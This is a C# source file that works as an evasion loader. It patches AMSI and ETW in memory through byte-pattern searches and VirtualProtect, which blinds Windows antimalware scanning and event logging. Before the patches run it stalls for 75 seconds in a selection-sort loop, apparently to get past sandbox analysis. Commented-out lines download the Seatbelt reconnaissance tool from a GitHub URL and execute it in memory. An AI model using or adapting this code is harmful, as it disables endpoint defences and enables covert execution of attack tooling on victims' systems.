using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;

namespace Code
{
    public class Program
    {
        // AMSI Bypass specific patch and egg bytes
        private static byte[] patch64 = new byte[] { 0xb8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
        private static byte[] egg64 = new byte[] {
            0x4C, 0x8B, 0xDC,       // mov     r11,rsp
            0x49, 0x89, 0x5B, 0x08, // mov     qword ptr [r11+8],rbx
            0x49, 0x89, 0x6B, 0x10, // mov     qword ptr [r11+10h],rbp
            0x49, 0x89, 0x73, 0x18, // mov     qword ptr [r11+18h],rsi
            0x57,                   // push    rdi
            0x41, 0x56,             // push    r14
            0x41, 0x57,             // push    r15
            0x48, 0x83, 0xEC, 0x70  // sub     rsp,70h
        };

        // ETW Bypass specific patch and egg bytes
        private static byte[] patch_code_x64 = new byte[] { 0x48, 0x33, 0xC0, 0xC3 };
        private static byte[] egg_x64 = new byte[]
        {
            0x4c, 0x8b, 0xdc,                           // mov     r11,rsp
            0x48, 0x83, 0xec, 0x58,                     // sub     rsp,58h
            0x4d, 0x89, 0x4b, 0xe8,                     // mov     qword ptr [r11-18h],r9
            0x33, 0xc0,                                 // xor     eax,eax
            0x45, 0x89, 0x43, 0xe0,                     // mov     dword ptr [r11-20h],r8d
            0x45, 0x33, 0xc9,                           // xor     r9d,r9d
            0x49, 0x89, 0x43, 0xd8,                     // mov     qword ptr [r11-28h],rax
            0x45, 0x33, 0xc0,                           // xor     r8d,r8d
        };

        [DllImport("kernel32")]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32")]
        private static extern IntPtr LoadLibrary(string name);

        [DllImport("kernel32")]
        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        // Finds the address of the specified byte pattern (egg) in memory starting from a given address
        private static IntPtr FindAddress(IntPtr address, byte[] egg)
        {
            while (true)
            {
                int count = 0;
                while (true)
                {
                    address = IntPtr.Add(address, 1);
                    if (Marshal.ReadByte(address) == egg[count])
                    {
                        count++;
                        if (count == egg.Length)
                            return IntPtr.Subtract(address, egg.Length - 1);
                    }
                    else
                    {
                        break;
                    }
                }
            }
        }

        // Applies a memory patch by replacing a specific byte pattern in a DLL function with the given patch code
        private static void MemoryPatch(string dllname, string funcname, byte[] egg, byte[] patch)
        {
            uint Oldprotect;
            uint Newprotect;

            IntPtr libAddr = LoadLibrary(dllname);
            if (libAddr == IntPtr.Zero)
            {
                Console.WriteLine("Failed to load DLL.");
                return;
            }

            IntPtr funcAddr = GetProcAddress(libAddr, funcname);
            if (funcAddr == IntPtr.Zero)
            {
                Console.WriteLine("Failed to get function address.");
                return;
            }

            IntPtr patchAddr = FindAddress(funcAddr, egg);

            if (!VirtualProtect(patchAddr, (UIntPtr)patch.Length, 0x40, out Oldprotect))
            {
                Console.WriteLine("Failed to change memory protection.");
                return;
            }

            Marshal.Copy(patch, 0, patchAddr, patch.Length);

            if (!VirtualProtect(patchAddr, (UIntPtr)patch.Length, Oldprotect, out Newprotect))
            {
                Console.WriteLine("Failed to restore memory protection.");
            }
        }

        // AMSI patching method
        private static void Scan()
        {
            MemoryPatch("amsi.dll", "DllCanUnloadNow", egg64, patch64);
        }

        // ETW patching method
        private static void Etw()
        {
            MemoryPatch("ntdll.dll", "RtlInitializeResource", egg_x64, patch_code_x64);
        }

        // Selection Sort Algorithm
        private static void SelectionSort(int[] array)
        {
            int n = array.Length;
            for (int i = 0; i < n - 1; i++)
            {
                int minIndex = i;
                for (int j = i + 1; j < n; j++)
                {
                    if (array[j] < array[minIndex])
                    {
                        minIndex = j;
                    }
                }
                int temp = array[minIndex];
                array[minIndex] = array[i];
                array[i] = temp;
            }
        }

        static void Main(string[] args)
        {
            // Create a large array of random integers
            int arraySize = 100000;
            int[] array = new int[arraySize];
            Random rand = new Random();
            for (int i = 0; i < arraySize; i++)
            {
                array[i] = rand.Next();
            }

            // Time the sorting operation
            Stopwatch stopwatch = Stopwatch.StartNew();
            while (stopwatch.Elapsed.TotalSeconds < 75)
            {
                SelectionSort(array);
            }

            Console.WriteLine("Selection sort completed after 75 seconds.");
            
            // Apply ETW patch
            Etw();
            // Apply AMSI patch
            Scan();

            // Load and execute external assembly
            //ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            //var sb = Assembly.Load(new WebClient().DownloadData("https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Seatbelt.exe"));
            //sb.EntryPoint.Invoke(null, new object[] { new string[] {"" } });

            // Output and wait for user input
            //Console.WriteLine(sb.FullName);
            //Console.WriteLine("Press any key to exit...");
            //Console.ReadKey();
        }
    }
}
